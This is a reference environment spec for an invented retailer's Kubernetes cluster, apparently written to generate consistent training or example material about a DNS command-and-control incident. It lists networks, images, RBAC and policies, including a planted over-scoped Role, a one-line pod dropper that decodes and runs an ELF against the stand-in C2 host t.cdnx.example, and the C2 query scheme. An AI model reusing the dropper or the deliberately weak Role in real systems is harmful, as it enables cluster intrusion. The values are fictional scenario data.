# Reference environment — Fjordmart

Fixed fictional environment used to generate consistent example material (logs,
manifests, Containerfiles, help tabs, popups, annotations). All names are invented
(RFC 2606 `.example`, RFC 1918 / RFC 5737 addresses). Reuse the values here
verbatim; do not invent parallel ones. Extend only within these facts.

This is an **infrastructure reference**, not a story. The incident at the end is a
handful of timeline points so that example logs and artifacts line up in time.

## Organization

- **Fjordmart AS** — fictional Nordic online retailer. Primary domain **`fjordmart.example`**.
- Business unit on the map: the webshop (`shop` namespace). Platform team runs the clusters.

| Person | Username | Email | Role / group |
|---|---|---|---|
| Ingrid Hagen | `ihagen` | ihagen@fjordmart.example | Platform lead (`platform-admins`) |
| Odd Nyquist | `onyquist` | onyquist@fjordmart.example | Platform engineer (`platform-admins`) |
| Marte Dahl | `mdahl` | mdahl@fjordmart.example | Shop tech lead (`shop-developers`) |
| Jonas Berg | `jberg` | jberg@fjordmart.example | Shop developer (`shop-developers`) |
| Henrik Moen | `hmoen` | hmoen@fjordmart.example | Security / IR (`security-ir`) |

## Domains

| Domain | Purpose |
|---|---|
| `fjordmart.example` | corporate root |
| `www.fjordmart.example`, `shop.fjordmart.example` | public storefront |
| `sso.fjordmart.example` | OIDC issuer (Keycloak) |
| `registry.fjordmart.example` | Harbor container registry |
| `git.fjordmart.example` | Forgejo git forge + CI |
| `argocd.fjordmart.example` | Argo CD |
| `vault.fjordmart.example` | Vault (secrets) |
| `ipam.fjordmart.example` | IPAM (NetBox) |
| `siem.fjordmart.example` | SIEM / log store |
| `k8s-prod.fjordmart.example` | prod cluster API + node DNS suffix |
| `cdnx.example` | **attacker-controlled**, posing as a CDN ("CDNx") |
| `t.cdnx.example` | attacker C2 label domain (base32 labels, TXT) |

## Networks

| Range | Use |
|---|---|
| `10.20.0.0/16` | corp/management LAN |
| `10.20.0.0/24` | core services (resolver `10.20.0.53`, IPAM, SSO) |
| `10.20.1.0/24` | control-plane nodes |
| `10.20.2.0/24` | infra nodes |
| `10.20.4.0/24` | worker nodes |
| `10.20.8.0/24` | MetalLB/BGP LoadBalancer pool |
| `10.244.0.0/16` | pod CIDR (per node /24) |
| `10.96.0.0/12` | service CIDR (kube-dns `10.96.0.10`) |
| `203.0.113.0/24` | public (NAT egress `203.0.113.10`, storefront VIP `203.0.113.20`) |
| `203.0.113.200` | attacker authoritative NS `ns1.cdnx.example` |

## Clusters

| Cluster | Purpose | Versions |
|---|---|---|
| `k8s-prod` | production | k8s **v1.34.1**, containerd **2.1.4**, runc, Cilium CNI |
| `platform-mgmt` | gitops / management | runs Argo CD, reconciles into `k8s-prod` |

Nodes in `k8s-prod` — Ubuntu **24.04.3 LTS**, kernel **6.8.0-85-generic**,
DNS suffix `k8s-prod.fjordmart.example`:

| Node | Node IP | Pod /24 | Role |
|---|---|---|---|
| `master-01..03` | 10.20.1.11–13 | — | control plane |
| `infra-01..02` | 10.20.2.11–12 | 10.244.1–2.0/24 | ingress, egress gateway |
| `worker-01` | 10.20.4.11 | 10.244.1.0/24 | worker |
| `worker-02` | 10.20.4.13 | 10.244.2.0/24 | worker |
| `worker-03` | **10.20.4.17** | 10.244.3.0/24 | worker (runs a CoreDNS replica; age 212d) |
| `worker-04` | 10.20.4.18 | 10.244.4.0/24 | worker |
| `worker-05` | **10.20.4.19** | 10.244.5.0/24 | worker |
| `worker-06` | 10.20.4.21 | 10.244.6.0/24 | worker |

## Platform stack

| Concern | Choice | Pods / location |
|---|---|---|
| CNI | Cilium (eBPF) + Hubble | `kube-system` |
| cluster DNS | CoreDNS | `kube-system/coredns-5d78c9869d-8hb2l` (10.244.3.12, worker-03, age 41d) |
| recursive resolver | unbound `dns-resolver-01` | `10.20.0.53`, log `/var/log/unbound/unbound.log` |
| classic ingress | ingress-nginx | `ingress-nginx` ns, infra nodes |
| Gateway API | kgateway | `gateway-system` ns |
| gitops | Argo CD | `argocd` ns |
| registry | Harbor | `registry.fjordmart.example` |
| secrets | Vault + External Secrets | `vault.fjordmart.example`, `external-secrets` ns |
| runtime detection | Falco | `falco/falco-7tq9d` (DaemonSet; instance on worker-05) |
| exec/kernel observ. | Tetragon | `kube-system/tetragon-p8x2z` (container `export-stdout`) |
| metrics/logs | Prometheus, Grafana, Loki | `monitoring` ns; forwarded to `siem.fjordmart.example` |

DNS forwarding: pod → `kube-dns` (10.96.0.10) → a CoreDNS replica → unbound
`10.20.0.53` → recursion. CoreDNS egress is SNAT'd to its node IP, so external
names from pods appear to unbound as the CoreDNS node's address.

## Registry and images

Registry `registry.fjordmart.example`, projects `base/`, `shop/`, `platform/`.

| Image | Base | Notes |
|---|---|---|
| `base/go:1.24` | mirror of `golang:1.24` | build stage |
| `base/distroless-static:nonroot` | mirror of distroless | runtime for Go apps |
| `base/node:22-slim`, `base/python:3.13-slim` | mirrors | other stacks |
| `shop/storefront:2.8.1` | distroless-static:nonroot | `@sha256:7b1a9f0c2e4d6a8b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e`, cosign-signed |
| `shop/catalog:1.19.0`, `shop/checkout:3.2.4`, `shop/cart:0.14.2`, `shop/search:2.0.1`, `shop/payments-proxy:1.6.0` | — | internal, signed, scanned |
| `docker.io/library/debian` | — | **not internal, unsigned**; `@sha256:9d4bf569e737266d93655e630c601e8810000116f0681e70f489c347717bd590` — only the rogue pod uses this |

Reference Containerfile style (`shop/storefront`, multi-stage Go → nonroot distroless):

```dockerfile
# syntax=docker/dockerfile:1
FROM registry.fjordmart.example/base/go:1.24 AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /out/storefront ./cmd/storefront

FROM registry.fjordmart.example/base/distroless-static:nonroot
LABEL org.opencontainers.image.source="https://git.fjordmart.example/shop/storefront"
LABEL org.opencontainers.image.version="2.8.1"
USER nonroot:nonroot
COPY --from=build /out/storefront /usr/local/bin/storefront
EXPOSE 8080
ENTRYPOINT ["/usr/local/bin/storefront"]
```

## Namespaces and workloads

| Namespace | Workload | Image | Replicas | ServiceAccount | Stack |
|---|---|---|---|---|---|
| `shop` | `storefront` (Deployment) | `shop/storefront:2.8.1` | 4 | `storefront` | Go, internet-exposed |
| `shop` | `catalog` | `shop/catalog:1.19.0` | 3 | `catalog` | Go |
| `shop` | `checkout` | `shop/checkout:3.2.4` | 2 | `checkout` | Java |
| `shop` | `cart` | `shop/cart:0.14.2` | 3 | `cart` | Node |
| `shop` | `search` | `shop/search:2.0.1` | 2 | `search` | Python |
| `shop` | `payments-proxy` | `shop/payments-proxy:1.6.0` | 2 | `payments-proxy` | Go, egress to PSP |
| `shop` | `cache-warmer` (bare Pod) | `docker.io/library/debian` | 1 | `storefront` | **rogue**, root, on worker-05 |

- Pod naming: `<deployment>-<replicaset-hash>-<suffix>` (e.g. `storefront-6c9fd4d8b7-x2n4k`).
  `cache-warmer` is a bare Pod (no owner ReplicaSet/Deployment) — itself an anomaly.
- Storefront path: internet → `203.0.113.20` → Service `type=LoadBalancer` →
  `ingress-nginx` → Ingress `shop.fjordmart.example` → Service ClusterIP
  `storefront` (10.96.12.40) → EndpointSlice → pod `:8080`.

## Identity and RBAC

- OIDC issuer `https://sso.fjordmart.example` (Keycloak). Groups: `platform-admins`
  (→ ClusterRoleBinding `cluster-admin`), `shop-developers` (→ RoleBinding `edit` in `shop`),
  `security-ir` (→ ClusterRole `view` + audit access).
- Every app Pod has its own ServiceAccount, token **auto-mounted** (default).
- `shop/default` ServiceAccount also auto-mounts.
- Planted weakness: Role `shop/storefront` is over-scoped —

  ```yaml
  # Role shop/storefront (as found)
  rules:
    - apiGroups: [""]
      resources: ["configmaps"]
      verbs: ["get", "list"]          # intended
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["create"]              # excessive — enables the pivot
  ```

  RoleBinding `shop/storefront` binds SA `shop/storefront` → Role `shop/storefront`.

## Network policies

| Policy | Kind | Scope | Effect |
|---|---|---|---|
| `shop/default-deny` | NetworkPolicy | `shop` | deny all ingress + egress (baseline) |
| `shop/storefront-allow` | NetworkPolicy | `app=storefront` | ingress `:8080` from ingress-nginx; egress `:53` to kube-dns, `:443` to `payments-proxy` |
| `anp-cluster-baseline` | BaselineAdminNetworkPolicy | cluster | tenant-isolation defaults |
| `shop/storefront-dns` | CiliumNetworkPolicy (`toFQDNs`) | `app=storefront` | **proposed, not deployed** — would allowlist FQDNs and deny `*.cdnx.example` |

Standard NetworkPolicy is L3/L4 only (reach to the resolver), not query names.
L7 DNS names need the Cilium `toFQDNs` policy above or resolver-side filtering.
(The diagram's `ClusterNetworkPolicy` label is the alpha/proposed name for
`AdminNetworkPolicy` — see review notes.)

## Admission / Pod Security

| Namespace | PSA `enforce` | PSA `audit` / `warn` | Should be | Admission engine |
|---|---|---|---|---|
| `shop` | `baseline` | `restricted` | `restricted` | — |
| `kube-system`, platform | `privileged` | — | as needed | — |

- No `ValidatingAdmissionPolicy` / Kyverno rule requires images from
  `registry.fjordmart.example` or rejects `docker.io/*`.
- `restricted` would require `runAsNonRoot` and reject the root `cache-warmer`.
- `audit`/`warn` = `restricted` only record and warn: `cache-warmer` was created (201) with a
  `pod-security.kubernetes.io/audit-violations` annotation in its audit event and a `Warning:` to the client.

## Supply chain

| Repo (`git.fjordmart.example`) | Content | Delivery |
|---|---|---|
| `shop/storefront` (+ one per app) | app source + Containerfile | CI → Harbor, cosign-signed |
| `shop/deploy` | Helm/Kustomize for `shop` | Argo CD application `shop` |
| `platform/clusters` | cluster config | Argo CD (platform-mgmt) |

- Protected `main`, 2 approvals, signed commits. CI runs scan (Trivy) + SBOM + sign.
- Every running workload should map to an Argo CD application. `cache-warmer` does
  not — created directly through the API, not via git.

## Evidence / log sources

| Source | Location | Default |
|---|---|---|
| API audit log | apiserver → `siem.fjordmart.example` | policy-dependent; retained |
| CoreDNS query log | `kube-system` | **off** by default |
| unbound query log | `dns-resolver-01:/var/log/unbound/unbound.log` | on |
| Hubble flows | Cilium (`dns-request proxy FORWARDED`) | on |
| Falco | `falco/falco-7tq9d` → SIEM | on |
| Tetragon | `kube-system/tetragon-p8x2z` | on |
| Pod stdout/stderr | Loki | on |
| IPAM | `ipam.fjordmart.example` | — |

## Incident timeline (anchor points)

Permanent date **2026-10-14, UTC**. Just enough so example logs match; not a narrative.

| Time (UTC) | Event |
|---|---|
| `03:38` | `shop/storefront` exploited via a vulnerable endpoint (a flaw in its own code; no CVE, Trivy scan clean); its mounted SA token read |
| `03:40` | stolen token + `create pods` → bare Pod `shop/cache-warmer` created (image `docker.io/library/debian`), scheduled to `worker-05` |
| `03:41:07.512Z` | Falco "Dropped binary executed in container" on `worker-05` (exe in overlay upper layer, root) → SIEM |
| `03:41`→ | implant `/tmp/.kworkerd` runs `-d t.cdnx.example`; DNS C2 begins |
| `03:48:10`–`03:48:18` | base32-label `TXT` queries to `t.cdnx.example`, ~2 s apart (CoreDNS, unbound, Hubble all log them); labels per 2 s: `traqee6ix6v5mrk7`, `traqefbozgtine3g`, `traqefpozb5337fb`, `traqefuldbgvatjj`, `traqef6xe7yh3wxh` |
| `04:00` | DNS C2 detected / on-call paged |

## Attacker

| Field | Value |
|---|---|
| internal tracking name | `TA-CDNX` |
| domains | `cdnx.example` (posing as CDN "CDNx"), C2 `t.cdnx.example` |
| authoritative NS | `ns1.cdnx.example` @ `203.0.113.200` |
| channel | DNS C2 — base32 data in query labels, `TXT` replies; ~2 s cadence |
| foothold image | `docker.io/library/debian` (public, unsigned) |
| dropped artifact | `/tmp/.kworkerd` (masquerade; from pod spec, not network), runs as root, not privileged |
| pod-spec dropper | `sh -c "echo <base64 ELF> \| base64 -d > /tmp/.kworkerd && chmod +x /tmp/.kworkerd && /tmp/.kworkerd -d t.cdnx.example"` (`f0VMRg` = `\x7fELF`) |

## Quick-copy constants

```
cluster        k8s-prod   (v1.34.1, containerd 2.1.4, Ubuntu 24.04.3, kernel 6.8.0-85-generic)
company        Fjordmart AS / fjordmart.example
node (egress)  worker-03  10.20.4.17   pod /24 10.244.3.0/24
node (rogue)   worker-05  10.20.4.19   pod /24 10.244.5.0/24
coredns        coredns-5d78c9869d-8hb2l   10.244.3.12 (worker-03)
kube-dns svc   10.96.0.10
resolver       dns-resolver-01  10.20.0.53  (unbound)
rogue pod      shop/cache-warmer  10.244.5.41 (worker-05), image docker.io/library/debian
debian digest  sha256:9d4bf569e737266d93655e630c601e8810000116f0681e70f489c347717bd590
storefront img registry.fjordmart.example/shop/storefront:2.8.1
C2 domain      t.cdnx.example   (ns1.cdnx.example 203.0.113.200)
C2 labels      traqe… (session 0x9c41 + seq + 6 B ciphertext, base32), 03:48:10 traqee6ix6v5mrk7
implant        /tmp/.kworkerd   (root, not privileged)
falco time     2026-10-14T03:41:07.512345678Z (worker-05)
```
